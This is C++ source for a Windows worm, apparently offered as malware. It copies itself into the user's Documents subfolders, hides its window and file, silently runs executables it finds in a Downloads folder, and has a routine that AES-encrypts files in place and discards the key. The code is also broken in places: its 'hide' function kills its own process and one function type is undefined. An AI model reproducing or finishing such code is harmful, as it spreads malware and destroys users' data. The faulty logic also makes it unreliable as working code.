#include <iostream>
#include <vector>
#include <filesystem>
#include <Windows.h>
#include <fstream>
#include <thread>
#include <chrono>
#include <TlHelp32.h>
#include <Shellapi.h>
#include <crypto++/aes.h>
#include <crypto++/modes.h>
#include <crypto++/osrng.h>

namespace fs = std::filesystem;
using namespace CryptoPP;

class ProcessHider {
public:
    static void HideProcess() {
        HWND hwnd = FindWindowA(NULL, "ConsoleWindowClass");
        if (hwnd != NULL) {
            ShowWindow(hwnd, SW_HIDE);
        }
    }
};

class ProcessEnumerator {
public:
    static void HideWormProcess() {
        DWORD currentProcessId = GetCurrentProcessId();
        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE) {
            return;
        }

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (!Process32First(hProcessSnap, &pe32)) {
            CloseHandle(hProcessSnap);
            return;
        }

        do {
            if (pe32.th32ProcessID == currentProcessId) {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                if (hProcess != NULL) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));

        CloseHandle(hProcessSnap);
    }
};

class FileHider {
public:
    static void HideWormFile(const std::string& wormPath) {
        DWORD attributes = GetFileAttributes(wormPath.c_str());
        if (attributes != INVALID_FILE_ATTRIBUTES) {
            SetFileAttributes(wormPath.c_str(), attributes | FILE_ATTRIBUTE_HIDDEN);
        }
    }
};

class WormReplicator {
public:
    static void ReplicateWorm(const std::string& sourcePath, const std::string& destinationDirectory) {
        std::string destinationPath = destinationDirectory + "\\worm.exe";
        std::ifstream sourceFile(sourcePath, std::ios::binary);
        std::ofstream destinationFile(destinationPath, std::ios::binary);
        destinationFile << sourceFile.rdbuf();
    }
};

class DownloadExecutor {
public:
    static void ExecuteDownload(const std::string& filePath) {
        ShellExecute(NULL, "open", filePath.c_str(), NULL, NULL, SW_HIDE);
    }
};

class DownloadMonitor {
public:
    static void MonitorDownloads(const std::string& downloadDirectory) {
        while (true) {
            for (const auto& entry : fs::directory_iterator(downloadDirectory)) {
                if (fs::is_regular_file(entry.path())) {
                    std::string filePath = entry.path().string();
                    if (IsValidExecutable(filePath)) {
                        DownloadExecutor::ExecuteDownload(filePath);
                    }
                }
            }
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }

    static bool IsValidExecutable(const std::string& filePath) {
        HINSTANCE dllHandle = LoadLibrary("isValidExecutable.dll");
        if (dllHandle == NULL) {
            return false;
        }

        IsValidExecutableFunc isValidExecutable = (IsValidExecutableFunc)GetProcAddress(dllHandle, "isValidExecutable");
        if (isValidExecutable == NULL) {
            FreeLibrary(dllHandle);
            return false;
        }

        bool result = isValidExecutable(filePath);
        FreeLibrary(dllHandle);
        return result;
    }
};

class FileEncryptor {
public:
    static void EncryptFile(const std::string& filePath) {
        // Read file contents
        std::ifstream inputFile(filePath, std::ios::binary);
        std::stringstream buffer;
        buffer << inputFile.rdbuf();
        std::string plainText = buffer.str();
        inputFile.close();

        // Generate a random AES key
        AutoSeededRandomPool prng;
        byte key[AES::DEFAULT_KEYLENGTH];
        prng.GenerateBlock(key, sizeof(key));

        // Perform AES encryption
        std::string cipherText;
        CBC_Mode<AES>::Encryption encryption(key, sizeof(key));
        StreamTransformationFilter encryptor(encryption, new StringSink(cipherText));
        encryptor.Put(reinterpret_cast<const unsigned char*>(plainText.c_str()), plainText.length());
        encryptor.MessageEnd();

        // Write encrypted data back to the file
        std::ofstream outputFile(filePath, std::ios::binary | std::ios::trunc);
        outputFile.write(reinterpret_cast<const char*>(cipherText.c_str()), cipherText.length());
        outputFile.close();

        // Note: Remember to securely store or transmit the encryption key
    }
};

class Rootkit {
public:
    static void StartWorm(const std::string& initialDirectory) {
        std::vector<std::string> targetDirectories;
        for (const auto& entry : fs::directory_iterator(initialDirectory)) {
            if (fs::is_directory(entry.path())) {
                targetDirectories.push_back(entry.path().string());
            }
        }
        for (const auto& directory : targetDirectories) {
            WormReplicator::ReplicateWorm("worm.exe", directory);
        }

        std::thread downloadThread(DownloadMonitor::MonitorDownloads, "C:\\Downloads");
        downloadThread.detach();
    }

    static int RootkitMain() {
        StartWorm("C:\\Users\\User\\Documents");
        ProcessHider::HideProcess();
        ProcessEnumerator::HideWormProcess();
        FileHider::HideWormFile("C:\\Users\\User\\Documents\\worm.exe");

        while (true) {
            Sleep(1000);
        }

        return 0;
    }
};

int main() {
    return Rootkit::RootkitMain();
}
